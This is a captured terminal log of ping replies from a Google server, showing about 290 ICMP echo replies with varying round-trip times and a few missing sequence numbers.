64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=16 ttl=128 time=175 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=17 ttl=128 time=60.4 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=18 ttl=128 time=137 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=19 ttl=128 time=117 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=20 ttl=128 time=163 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=21 ttl=128 time=140 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=22 ttl=128 time=74.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=23 ttl=128 time=93.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=24 ttl=128 time=1172 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=25 ttl=128 time=222 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=26 ttl=128 time=206 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=27 ttl=128 time=436 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=28 ttl=128 time=200 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=29 ttl=128 time=70.7 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=30 ttl=128 time=88.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=31 ttl=128 time=96.3 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=32 ttl=128 time=259 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=33 ttl=128 time=2632 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=34 ttl=128 time=1621 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=35 ttl=128 time=597 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=36 ttl=128 time=2120 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=37 ttl=128 time=1760 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=38 ttl=128 time=739 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=39 ttl=128 time=65.3 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=40 ttl=128 time=179 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=41 ttl=128 time=70.3 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=42 ttl=128 time=65.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=43 ttl=128 time=66.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=44 ttl=128 time=77.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=45 ttl=128 time=73.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=46 ttl=128 time=61.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=47 ttl=128 time=90.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=48 ttl=128 time=65.4 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=49 ttl=128 time=74.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=50 ttl=128 time=74.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=51 ttl=128 time=60.3 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=52 ttl=128 time=89.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=53 ttl=128 time=97.6 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=54 ttl=128 time=245 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=55 ttl=128 time=102 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=56 ttl=128 time=312 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=57 ttl=128 time=111 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=58 ttl=128 time=91.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=59 ttl=128 time=118 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=60 ttl=128 time=66.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=61 ttl=128 time=290 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=62 ttl=128 time=191 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=63 ttl=128 time=152 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=64 ttl=128 time=154 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=65 ttl=128 time=139 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=66 ttl=128 time=198 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=67 ttl=128 time=113 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=68 ttl=128 time=102 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=69 ttl=128 time=79.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=70 ttl=128 time=84.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=71 ttl=128 time=191 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=72 ttl=128 time=136 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=73 ttl=128 time=97.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=76 ttl=128 time=211 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=77 ttl=128 time=66.5 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=79 ttl=128 time=60.4 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=80 ttl=128 time=70.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=81 ttl=128 time=76.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=82 ttl=128 time=84.5 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=83 ttl=128 time=73.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=84 ttl=128 time=216 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=85 ttl=128 time=82.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=86 ttl=128 time=65.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=87 ttl=128 time=69.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=88 ttl=128 time=82.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=89 ttl=128 time=68.5 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=90 ttl=128 time=113 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=91 ttl=128 time=164 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=92 ttl=128 time=341 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=93 ttl=128 time=75.6 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=94 ttl=128 time=72.6 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=95 ttl=128 time=81.3 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=96 ttl=128 time=99.7 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=97 ttl=128 time=68.6 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=98 ttl=128 time=98.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=99 ttl=128 time=97.4 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=100 ttl=128 time=74.7 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=101 ttl=128 time=124 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=102 ttl=128 time=113 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=103 ttl=128 time=101 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=104 ttl=128 time=104 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=105 ttl=128 time=68.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=106 ttl=128 time=278 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=107 ttl=128 time=76.6 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=108 ttl=128 time=68.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=109 ttl=128 time=57.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=110 ttl=128 time=76.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=111 ttl=128 time=58.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=112 ttl=128 time=64.7 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=113 ttl=128 time=64.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=114 ttl=128 time=63.3 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=115 ttl=128 time=73.7 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=116 ttl=128 time=72.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=117 ttl=128 time=112 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=118 ttl=128 time=100 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=119 ttl=128 time=101 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=120 ttl=128 time=96.6 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=121 ttl=128 time=67.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=122 ttl=128 time=66.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=123 ttl=128 time=116 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=124 ttl=128 time=104 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=125 ttl=128 time=64.4 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=126 ttl=128 time=62.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=127 ttl=128 time=60.5 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=128 ttl=128 time=74.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=129 ttl=128 time=78.6 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=130 ttl=128 time=75.4 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=131 ttl=128 time=72.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=132 ttl=128 time=72.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=133 ttl=128 time=83.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=134 ttl=128 time=102 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=135 ttl=128 time=56.6 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=136 ttl=128 time=64.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=137 ttl=128 time=131 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=138 ttl=128 time=82.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=139 ttl=128 time=107 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=140 ttl=128 time=66.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=141 ttl=128 time=96.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=142 ttl=128 time=118 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=143 ttl=128 time=101 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=144 ttl=128 time=69.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=145 ttl=128 time=76.5 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=146 ttl=128 time=104 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=147 ttl=128 time=105 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=148 ttl=128 time=72.3 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=149 ttl=128 time=58.4 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=150 ttl=128 time=218 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=151 ttl=128 time=83.6 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=152 ttl=128 time=89.6 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=153 ttl=128 time=76.6 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=154 ttl=128 time=65.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=155 ttl=128 time=61.6 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=156 ttl=128 time=73.6 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=157 ttl=128 time=175 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=158 ttl=128 time=102 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=159 ttl=128 time=92.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=160 ttl=128 time=73.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=161 ttl=128 time=141 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=162 ttl=128 time=152 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=163 ttl=128 time=170 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=164 ttl=128 time=76.4 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=165 ttl=128 time=68.6 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=166 ttl=128 time=88.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=167 ttl=128 time=62.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=168 ttl=128 time=161 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=169 ttl=128 time=182 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=170 ttl=128 time=209 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=171 ttl=128 time=104 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=172 ttl=128 time=85.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=173 ttl=128 time=73.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=174 ttl=128 time=59.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=175 ttl=128 time=65.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=176 ttl=128 time=103 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=177 ttl=128 time=104 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=178 ttl=128 time=182 ms
^L64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=179 ttl=128 time=163 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=180 ttl=128 time=129 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=181 ttl=128 time=63.3 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=182 ttl=128 time=64.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=183 ttl=128 time=165 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=184 ttl=128 time=200 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=185 ttl=128 time=92.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=187 ttl=128 time=338 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=188 ttl=128 time=97.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=189 ttl=128 time=95.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=190 ttl=128 time=59.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=191 ttl=128 time=68.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=192 ttl=128 time=66.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=193 ttl=128 time=92.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=194 ttl=128 time=92.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=195 ttl=128 time=113 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=196 ttl=128 time=90.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=197 ttl=128 time=305 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=198 ttl=128 time=192 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=200 ttl=128 time=214 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=201 ttl=128 time=155 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=202 ttl=128 time=88.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=204 ttl=128 time=191 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=205 ttl=128 time=59.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=206 ttl=128 time=77.4 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=207 ttl=128 time=64.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=208 ttl=128 time=76.5 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=209 ttl=128 time=65.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=210 ttl=128 time=112 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=211 ttl=128 time=98.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=212 ttl=128 time=96.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=213 ttl=128 time=70.7 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=214 ttl=128 time=60.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=215 ttl=128 time=73.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=216 ttl=128 time=71.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=217 ttl=128 time=67.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=218 ttl=128 time=86.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=219 ttl=128 time=82.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=221 ttl=128 time=176 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=222 ttl=128 time=108 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=223 ttl=128 time=120 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=224 ttl=128 time=71.5 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=225 ttl=128 time=89.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=226 ttl=128 time=97.5 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=227 ttl=128 time=80.3 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=228 ttl=128 time=120 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=229 ttl=128 time=97.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=230 ttl=128 time=86.5 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=231 ttl=128 time=131 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=232 ttl=128 time=70.6 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=233 ttl=128 time=121 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=234 ttl=128 time=171 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=235 ttl=128 time=62.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=236 ttl=128 time=68.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=237 ttl=128 time=59.6 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=238 ttl=128 time=88.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=239 ttl=128 time=46.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=240 ttl=128 time=105 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=241 ttl=128 time=65.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=242 ttl=128 time=65.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=243 ttl=128 time=80.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=244 ttl=128 time=78.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=245 ttl=128 time=90.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=246 ttl=128 time=75.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=247 ttl=128 time=62.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=248 ttl=128 time=77.5 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=249 ttl=128 time=79.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=250 ttl=128 time=66.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=251 ttl=128 time=70.4 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=252 ttl=128 time=64.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=253 ttl=128 time=61.5 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=254 ttl=128 time=222 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=255 ttl=128 time=112 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=256 ttl=128 time=225 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=257 ttl=128 time=605 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=258 ttl=128 time=290 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=259 ttl=128 time=323 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=260 ttl=128 time=499 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=261 ttl=128 time=219 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=262 ttl=128 time=112 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=263 ttl=128 time=119 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=264 ttl=128 time=61.5 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=265 ttl=128 time=76.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=266 ttl=128 time=64.3 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=267 ttl=128 time=74.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=268 ttl=128 time=71.3 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=269 ttl=128 time=68.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=270 ttl=128 time=95.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=271 ttl=128 time=74.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=272 ttl=128 time=63.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=273 ttl=128 time=80.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=274 ttl=128 time=71.7 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=275 ttl=128 time=100 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=276 ttl=128 time=107 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=277 ttl=128 time=60.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=278 ttl=128 time=82.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=279 ttl=128 time=82.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=280 ttl=128 time=76.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=281 ttl=128 time=86.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=282 ttl=128 time=136 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=283 ttl=128 time=74.1 ms
s64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=284 ttl=128 time=83.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=285 ttl=128 time=68.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=286 ttl=128 time=93.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=287 ttl=128 time=71.9 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=288 ttl=128 time=61.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=289 ttl=128 time=85.4 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=290 ttl=128 time=63.4 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=291 ttl=128 time=68.2 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=292 ttl=128 time=73.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=293 ttl=128 time=76.1 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=294 ttl=128 time=66.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=295 ttl=128 time=84.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=296 ttl=128 time=62.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=297 ttl=128 time=58.3 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=298 ttl=128 time=67.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=299 ttl=128 time=66.8 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=300 ttl=128 time=63.0 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=301 ttl=128 time=102 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=302 ttl=128 time=102 ms
64 bytes from del03s18-in-f14.1e100.net (172.217.167.206): icmp_seq=303 ttl=128 time=72.9 ms
